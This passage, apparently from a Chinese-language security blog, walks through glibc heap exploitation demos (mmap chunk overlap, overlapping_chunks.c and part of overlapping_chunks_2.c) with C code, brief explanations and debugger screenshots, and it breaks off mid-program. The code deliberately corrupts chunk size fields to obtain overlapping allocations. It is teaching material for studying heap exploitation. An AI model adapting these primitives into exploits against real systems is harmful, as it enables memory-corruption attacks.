	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Change the size of the third mmap chunk to overlap with the second mmap chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This will cause both chunks to be Munmapped and given back to the system\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span>
	<span class="token comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span>
	mmap_chunk_3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0xFFFFFFFFFD</span> <span class="token operator">&amp;</span> mmap_chunk_3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0xFFFFFFFFFD</span> <span class="token operator">&amp;</span> mmap_chunk_2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"New size of third mmap chunk: 0x%llx\n"</span><span class="token punctuation">,</span> mmap_chunk_3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Free the third mmap chunk, which munmaps the second and third chunks\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">free</span><span class="token punctuation">(</span>mmap_chunk_3<span class="token punctuation">)</span><span class="token punctuation">;</span> 

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Get a very large chunk from malloc to get mmapped chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This should overlap over the previously munmapped/freed chunks\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span> overlapping_chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x300000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Overlapped chunk Ptr: %p\n"</span><span class="token punctuation">,</span> overlapping_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Overlapped chunk Ptr Size: 0x%llx\n"</span><span class="token punctuation">,</span> overlapping_chunk<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Gets the distance between the two pointers.</span>
	<span class="token keyword">int</span> distance <span class="token operator">=</span> mmap_chunk_2 <span class="token operator">-</span> overlapping_chunk<span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n"</span><span class="token punctuation">,</span> distance<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Value of index 0 of mmap chunk 2 prior to write: %llx\n"</span><span class="token punctuation">,</span> mmap_chunk_2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token comment">// Set the value of the overlapped chunk.</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Setting the value of the overlapped chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	overlapping_chunk<span class="token punctuation">[</span>distance<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1122334455667788</span><span class="token punctuation">;</span>

	<span class="token comment">// Show that the pointer has been written to.</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Second chunk value (after write): 0x%llx\n"</span><span class="token punctuation">,</span> mmap_chunk_2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Overlapped chunk value: 0x%llx\n\n"</span><span class="token punctuation">,</span> overlapping_chunk<span class="token punctuation">[</span>distance<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Boom! The new chunk has been overlapped with a previous mmaped chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">assert</span><span class="token punctuation">(</span>mmap_chunk_2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> overlapping_chunk<span class="token punctuation">[</span>distance<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><strong>mmap：</strong>用户申请的内存过大，调用mmap函数为用户映射一块单独的虚拟内存，释放时，调用munmap函数将该空间返还操作系统内核</p>
<p><strong>mmap chunk：</strong>size域：bit 1用于表示该chunk是否由mmap产生；</p>
<p>prev size域用于表示mmap chunk的剩余大小（内核调用mmap函数通常会分配一块大于用户需求的内存）</p>
<p>fd和bk指针无意义</p>
<p>程序申请一个小chunk，在分配3块大chunk：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621200350765.png"></p>
<p>其中第一块chunk在libc之上，其他两块都在libc之下</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621201222269.png"></p>
<p>修改chunk3的size：</p>
<p>修改前：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621201920449.png"></p>
<p>修改后：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621201955909.png"></p>
<p>释放chunk3，由于修改了chunk3的size，覆盖了chunk2，会将chunk2一起释放：</p>
<p>访问不到chunk2和chunk3</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621202658099.png"></p>
<p>申请overlapping_chunk:</p>
<p>该chunk完全覆盖了chunk2和chunk3&#x3D;&#x3D;&#x3D;》</p>
<p><strong>通过chunk4修改chunk2的值</strong></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621203234501.png"></p>
<h3 id="overlapping-chunks-c"><a href="#overlapping-chunks-c" class="headerlink" title="overlapping_chunks.c"></a>overlapping_chunks.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>


	<span class="token class-name">intptr_t</span> <span class="token operator">*</span>p1<span class="token punctuation">,</span><span class="token operator">*</span>p2<span class="token punctuation">,</span><span class="token operator">*</span>p3<span class="token punctuation">,</span><span class="token operator">*</span>p4<span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThis is a simple chunks overlapping problem\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Let's start to allocate 3 chunks on the heap\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">,</span> p2<span class="token punctuation">,</span> p3<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">memset</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token char">'1'</span><span class="token punctuation">,</span> <span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span>p2<span class="token punctuation">,</span> <span class="token char">'2'</span><span class="token punctuation">,</span> <span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span>p3<span class="token punctuation">,</span> <span class="token char">'3'</span><span class="token punctuation">,</span> <span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow let's free the chunk p2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"For a toy program, the value of the last 3 bits is unimportant;"</span>
		<span class="token string">" however, it is best to maintain the stability of the heap.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"</span>
		<span class="token string">" to assure that p1 is not mistaken for a free chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">int</span> evil_chunk_size <span class="token operator">=</span> <span class="token number">0x181</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> evil_region_size <span class="token operator">=</span> <span class="token number">0x180</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n"</span><span class="token punctuation">,</span>
		 evil_chunk_size<span class="token punctuation">,</span> evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token operator">*</span><span class="token punctuation">(</span>p2<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> evil_chunk_size<span class="token punctuation">;</span> <span class="token comment">// we are overwriting the "size" field of chunk p2</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow let's allocate another chunk with a size equal to the data\n"</span>
	       <span class="token string">"size of the chunk p2 injected size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This malloc will be served from the previously freed chunk that\n"</span>
	       <span class="token string">"is parked in the unsorted bin which size has been modified by us\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\np4 has been allocated at %p and ends at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token operator">+</span>evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p3 starts at %p and ends at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token operator">+</span><span class="token number">0x80</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p4 should overlap with p3, in this case p4 includes all p3.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"</span>
		<span class="token string">" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Let's run through an example. Right now, we have:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p4 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p3 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nIf we memset(p4, '4', %d), we have:\n"</span><span class="token punctuation">,</span> evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span>p4<span class="token punctuation">,</span> <span class="token char">'4'</span><span class="token punctuation">,</span> evil_region_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p4 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p3 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nAnd if we then memset(p3, '3', 80), we have:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span>p3<span class="token punctuation">,</span> <span class="token char">'3'</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p4 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p3 = %s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>创建3个chunk，并初始化：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621204934293.png"></p>
<p>释放p2，并修改p2的size：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621205414155.png"></p>
<p>申请chunk p4，将会将篡改后的p2申请回来，并重叠p3：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220621210516478.png"></p>
<p>此时p4就有了p3的控制权</p>
<h3 id="overlapping-chunks-2-c"><a href="#overlapping-chunks-2-c" class="headerlink" title="overlapping_chunks_2.c"></a>overlapping_chunks_2.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  
  <span class="token class-name">intptr_t</span> <span class="token operator">*</span>p1<span class="token punctuation">,</span><span class="token operator">*</span>p2<span class="token punctuation">,</span><span class="token operator">*</span>p3<span class="token punctuation">,</span><span class="token operator">*</span>p4<span class="token punctuation">,</span><span class="token operator">*</span>p5<span class="token punctuation">,</span><span class="token operator">*</span>p6<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> real_size_p1<span class="token punctuation">,</span>real_size_p2<span class="token punctuation">,</span>real_size_p3<span class="token punctuation">,</span>real_size_p4<span class="token punctuation">,</span>real_size_p5<span class="token punctuation">,</span>real_size_p6<span class="token punctuation">;</span>
  <span class="token keyword">int</span> prev_in_use <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThis is a simple chunks overlapping problem"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nLet's start to allocate 5 chunks on the heap:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  p5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  real_size_p1 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  real_size_p2 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  real_size_p3 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  real_size_p4 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  real_size_p5 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p5<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\n\nchunk p1 from %p to %p"</span><span class="token punctuation">,</span> p1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p1<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p2 from %p to %p"</span><span class="token punctuation">,</span> p2<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p2<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p3 from %p to %p"</span><span class="token punctuation">,</span> p3<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p3<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p4 from %p to %p"</span><span class="token punctuation">,</span> p4<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p4<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p5 from %p to %p\n"</span><span class="token punctuation">,</span> p5<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p5<span class="token operator">+</span><span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">memset</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token char">'A'</span><span class="token punctuation">,</span>real_size_p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>p2<span class="token punctuation">,</span><span class="token char">'B'</span><span class="token punctuation">,</span>real_size_p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>p3<span class="token punctuation">,</span><span class="token char">'C'</span><span class="token punctuation">,</span>real_size_p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>p4<span class="token punctuation">,</span><span class="token char">'D'</span><span class="token punctuation">,</span>real_size_p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>p5<span class="token punctuation">,</span><span class="token char">'E'</span><span class="token punctuation">,</span>real_size_p5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nLet's free the chunk p4.\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  
  <span class="token function">free</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p1 <span class="token operator">+</span> real_size_p1 <span class="token punctuation">)</span> <span class="token operator">=</span> real_size_p2 <span class="token operator">+</span> real_size_p3 <span class="token operator">+</span> prev_in_use <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">//&lt;--- BUG HERE </span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThis operation will basically create a big free chunk that wrongly includes p3\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  p6 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  real_size_p6 <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p6<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nchunk p6 from %p to %p"</span><span class="token punctuation">,</span> p6<span class="token punctuation">,</span>  <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p6<span class="token operator">+</span>real_size_p6<span class="token punctuation">)</span><span class="token punctuation">;</span>
